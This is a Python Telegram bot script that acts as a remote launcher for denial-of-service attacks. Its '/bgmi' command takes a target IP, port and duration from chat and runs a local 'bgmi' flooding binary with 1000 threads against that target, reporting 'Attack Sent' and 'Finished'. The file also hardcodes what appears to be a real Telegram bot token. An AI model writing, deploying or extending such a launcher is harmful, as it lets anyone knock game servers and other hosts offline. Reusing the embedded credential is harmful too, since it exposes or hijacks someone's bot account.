import os, telebot, subprocess, threading, time
from flask import Flask

TOKEN = "8367229982:AAHu-4n-PfhAq1P5qwHZ1WavY8QZcmP4DjE"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "🚀 BOT ACTIVE")

@bot.message_handler(commands=['bgmi'])
def bgmi(m):
    try:
        args = m.text.split()[1:]
        ip, port, dur = args[0], args[1], args[2]
        bot.reply_to(m, f"🚀 Attack Sent to {ip}")
        def run():
            subprocess.run(["./bgmi", ip, port, str(dur), "1000"], timeout=int(dur)+10)
            bot.send_message(m.chat.id, f"✅ Finished: {ip}")
        threading.Thread(target=run, daemon=True).start()
    except:
        bot.reply_to(m, "❌ Usage: /bgmi <IP> <PORT> <TIME>")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()
    bot.infinity_polling()
